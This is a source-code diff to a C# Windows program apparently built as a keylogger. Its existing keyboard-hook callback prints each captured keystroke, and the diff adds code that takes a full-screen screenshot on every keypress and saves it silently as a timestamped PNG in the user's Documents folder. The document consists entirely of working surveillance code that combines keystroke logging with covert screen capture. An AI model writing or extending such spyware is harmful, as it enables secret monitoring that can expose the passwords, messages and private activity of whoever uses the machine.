@@ -6,6 +6,9 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
+using System.Drawing;
+using System.Drawing.Imaging;
+
 namespace keystroke
 {
     static class Program
@@ -48,6 +51,26 @@ namespace keystroke
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
+
+                Bitmap memoryImage;
+
+                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+
+                memoryImage = new Bitmap(screenWidth, screenHeight);
+                Size s = new Size(memoryImage.Width, memoryImage.Height);
+
+                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+
+                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+
+                //That's it! Save the image in the directory and this will work like charm.  
+                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
+                          @"\Screenshot" + "_" +
+                          DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
+
+                // save it  
+                memoryImage.Save(fileName);
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
